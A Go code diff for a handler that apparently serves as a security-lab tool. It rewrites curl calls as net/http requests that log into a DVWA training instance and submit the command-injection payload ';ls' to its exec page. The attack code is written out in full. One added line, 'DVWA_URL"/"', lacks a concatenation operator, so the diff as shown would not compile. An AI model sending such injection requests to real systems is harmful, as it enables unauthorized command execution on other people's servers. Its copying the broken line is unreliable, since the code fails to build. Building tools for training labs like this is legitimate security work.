@@ -1,11 +1,12 @@
 package main
 
 import (
-	"crypto/tls"
 	"fmt"
+	"io/ioutil"
 	"log"
 	"net/http"
-	"os/exec"
+	"net/http/cookiejar"
+	"net/url"
 	"strings"
 
 	"github.com/labstack/echo/v4"
@@ -43,55 +44,93 @@ func handleCommandInjectionAction(c echo.Context) error {
 		return c.String(http.StatusBadRequest, "Invalid username")
 	}
 
+	jar, err := cookiejar.New(nil)
+	if err != nil {
+		return c.String(http.StatusInternalServerError, err.Error())
+	}
+
+	client := &http.Client{
+		Jar: jar,
+	}
+
 	// Perform Authentication
-	cmd := exec.Command("curl", DVWA_URL+"/login.php",
-		"-H", "authority: "+DVWA_HOST,
-		"-H", "cache-control: max-age=0",
-		"-H", "content-type: application/x-www-form-urlencoded",
-		"-H", "origin: "+DVWA_URL,
-		"-H", "referer: "+DVWA_URL+"/",
-		"-H", "user-agent: "+USER_AGENT,
-		"--insecure",
-		"--silent",
-		"--data-raw", "username="+username+"&password="+password+"&Login=Login",
-		"-c", "cookie.txt",
-	)
-
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		if exitError, ok := err.(*exec.ExitError); ok && exitError.ExitCode() != 0 {
-			return c.HTML(http.StatusOK, `<pre style="color: red; font-family: 'Courier New', monospace; white-space: pre-wrap;">The Virtual Server is not reachable</pre>`)
-		}
-		return c.String(http.StatusInternalServerError, err.Error())
+	data := url.Values{
+		"username": {username},
+		"password": {password},
+		"Login":    {"Login"},
 	}
-
-	// Execute Command Injection
-	cmd2 := exec.Command("curl", DVWA_URL+"/vulnerabilities/exec/",
-		"-H", "authority: "+DVWA_HOST,
-		"-H", "cache-control: max-age=0",
-		"-H", "content-type: application/x-www-form-urlencoded",
-		"-H", "origin: "+DVWA_URL,
-		"-H", "referer: "+DVWA_URL+"/index.php",
-		"-H", "user-agent: "+USER_AGENT,
-		"--insecure",
-		"--silent",
-		"--data-raw", "ip=;ls&Submit=Submit",
-		"-b", "cookie.txt",
-	)
-
-	output2, err := cmd2.CombinedOutput()
+	req, err := http.NewRequest("POST", DVWA_URL+"/login.php", strings.NewReader(data.Encode()))
 	if err != nil {
 		return c.String(http.StatusInternalServerError, err.Error())
 	}
 
-	// Check the exit status of the commands
-	if cmd.ProcessState.ExitCode() != 0 || cmd2.ProcessState.ExitCode() != 0 {
+	req.Header.Set("authority", DVWA_HOST)
+	req.Header.Set("origin", DVWA_URL)
+	req.Header.Set("referer", DVWA_URL"/")
+	req.Header.Set("user-agent", USER_AGENT)
+	req.Header.Set("cache-control", "max-age=0")
+	req.Header.Set("content-type", "application/x-www-form-urlencoded")
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
+	req.Header.Set("Connection", "keep-alive")
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
+
+
+	resp, err := client.Do(req)
+	if err != nil {
 		return c.HTML(http.StatusOK, `<pre style="color: red; font-family: 'Courier New', monospace; white-space: pre-wrap;">The Virtual Server is not reachable</pre>`)
 	}
 
-	// Return the HTML content of the two curl commands
-	return c.HTML(http.StatusOK, string(output)+"\n"+string(output2))
+	defer resp.Body.Close()
+
+	output, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return c.String(http.StatusInternalServerError, err.Error())
+	}
+
+	// Log the response body
+	log.Print(string(output))
+
+	// Execute Command Injection
+	data = url.Values{
+		"ip":     {";ls"},
+		"Submit": {"Submit"},
+	}
+	req, err = http.NewRequest("POST", DVWA_URL+"/vulnerabilities/exec/", strings.NewReader(data.Encode()))
+	if err != nil {
+		return c.String(http.StatusInternalServerError, err.Error())
+	}
+
+	req.Header.Set("authority", DVWA_HOST)
+	req.Header.Set("origin", DVWA_URL)
+	req.Header.Set("referer", DVWA_URL+"/index.php")
+	req.Header.Set("user-agent", USER_AGENT)
+	req.Header.Set("cache-control", "max-age=0")
+	req.Header.Set("content-type", "application/x-www-form-urlencoded")
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
+	req.Header.Set("Connection", "keep-alive")
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
+
+	resp, err = client.Do(req)
+	if err != nil {
+		return c.HTML(http.StatusOK, `<pre style="color: red; font-family: 'Courier New', monospace; white-space: pre-wrap;">The Virtual Server is not reachable</pre>`)
+	}
+
+	defer resp.Body.Close()
+
+	output2, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return c.String(http.StatusInternalServerError, err.Error())
+	}
+
+	// Log the response body
+	log.Print(string(output2))
+
+	// Return the HTML content
+	return c.HTML(http.StatusOK, string(output2))
 }
+
 
 ///////////////////////////////////////////////////////////////////////////////////
 // SQL INJECTION                                                                 //
